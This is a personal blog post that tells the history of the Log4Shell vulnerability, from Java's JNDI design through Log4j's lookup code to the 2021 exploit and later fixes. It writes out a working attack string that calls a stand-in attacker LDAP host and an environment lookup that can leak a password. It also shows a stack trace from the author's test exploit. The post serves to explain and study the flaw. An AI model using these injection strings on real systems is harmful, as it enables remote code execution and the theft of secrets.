# Log4Shell exploit story
*November 13, 2026*


>In December 2021, the Log4Shell ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/cve-2021-44228)) exploit made a lot of noise, and I want to tell you the long story of how it became possible.

In 1999, 64 MB of RAM was normal for a server (not 64 GB), and it was too expensive to run each Java web application in a separate JVM. So, the Java Servlet 2.2 specification introduced the WAR file format - a ZIP archive with the content that defines a Java web application. Apache Tomcat 3.0 supported deployment of several WAR files in one JVM. In 2001, the Java Servlet 2.3 specification was introduced, and it supported JNDI lookups with the `java:comp/env` prefix.

In 2007, Logback added a new feature: configuring logging according to JNDI lookups for constant names
 `JNDI_CONFIGURATION_RESOURCE = "java:comp/env/logback/configuration-resource"` and `JNDI_CONTEXT_NAME = "java:comp/env/logback/context-name"`. No security issue [here](https://github.com/qos-ch/logback/commit/ae37a91bcc26a0366b20d30c00b97ea183bbd692).

 But in 2013, Log4j decided to get feature parity and created [LOG4J2-313](https://issues.apache.org/jira/browse/LOG4J2-313). The intended use was only in configuration files like `<Routes pattern="$${jndi:logging/context-name}">`. There were already many other string substitutors; one more did not look dangerous. But the java:comp/env prefix was added like that:

```java
    private String convertJndiName(String jndiName) {
        if (!jndiName.startsWith(CONTAINER_JNDI_RESOURCE_PATH_PREFIX) && jndiName.indexOf(':') == -1) {
            jndiName = CONTAINER_JNDI_RESOURCE_PATH_PREFIX + jndiName;
        }

        return jndiName;
    }
```    

where

```java 
static final String CONTAINER_JNDI_RESOURCE_PATH_PREFIX = "java:comp/env/";
```

I totally understand this approach: accept everything and give the admin maximum flexibility for configuration. If the prefix is already in place, that's OK. If there is a colon, do not touch anything; the admin knows better. The problem was that `org.apache.logging.log4j.core.lookup.Interpolator` was used not only for configuration files, but also for ordinary log messages, where a developer can log anything, including user input. If a user enters `${jndi:key}`,  `java:comp/env/key` value will be logged (if configured). `${env:PASSWORD}` also works for many Log4j versions, and this is another security issue.

And in 2021, when nobody deploys different web applications on the same JVM, attackers discovered that `${jndi:ldap://badCriminal.com:1389/a}` bypasses adding the prefix because of the colon and `javax.naming.InitialContext.lookup()` method would be called with `ldap://badCriminal.com:1389/a` as a parameter. Absolutely nothing in Javadoc says that this method can initialize a class downloaded from the Internet, and using user input as a parameter gives attackers an opportunity for remote code execution.

I wrote an exploit class that prints a stacktrace:

```
java.lang.Exception
	at Exploit.<clinit>(Exploit.java:4)
	at java.lang.Class.forName0(Native Method)
	at java.lang.Class.forName(Class.java:348)
	at com.sun.naming.internal.VersionHelper12.loadClass(VersionHelper12.java:72)
	at com.sun.naming.internal.VersionHelper12.loadClass(VersionHelper12.java:87)
	at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:158)
	at javax.naming.spi.DirectoryManager.getObjectInstance(DirectoryManager.java:189)
	at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1085)
	at com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
	at com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)
	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
	at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
	at javax.naming.InitialContext.lookup(InitialContext.java:417)
	at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)
	...
```

Look at it: all bad things are happening deep inside Java internals. So, the landmine was placed long ago by Sun Microsystems in [RFC 2713](https://www.rfc-editor.org/info/rfc2713/). I am not an expert in the LDAP protocol, but it seems to me a very strange idea to download bytecode from an LDAP server and run it. 

I searched for **JNDI Injection** and found [detailed slides](https://blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf) from Black Hat USA 2016 conference.  In Java 8u121, released in 2017, findings from this presentation were partially addressed, but the LDAP attack vector [was fixed only in Java 8u191 in 2018](https://bugzilla.redhat.com/show_bug.cgi?id=1639834). Need to notices, that this is not a complete solution, remaining attach vector [expalined here](https://www.veracode.com/blog/research/exploiting-jndi-injections-java).


Why was Log4Shell such an issue in 2021? I can reproduce this vulnerability at home easily, because I have Java 8u66 installed on my desktop in 2015 (hardware of this machine was totally renewed, and it runs another operating system now). There is no surprise that many companies were running old Java 8 distributions in production in 2021.

For the attack part, I used [project published in 2017](https://github.com/mbechler/marshalsec). So in 2021 it was trivial to implement a Log4Shell exploit.

2 more related CVEs were discovered in Log4j [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/cve-2021-45046) and [CVE-2021-45105](https://nvd.nist.gov/vuln/detail/cve-2021-45105), but it was not so dangerous.

Remote code downloading in JNDI is permanently disabled in [Java 24](https://bugs.openjdk.org/browse/JDK-8338536).

Why am I writing this article in 2026? Because I am looking for a job in Israel, and cybersecurity companies here are growing fast. So, I did this research to improve my skills. And it is clear why demand is growing for cybersecurity solutions: with AI, the next Log4Shell-like vulnerability will not wait eight years before being exploited.

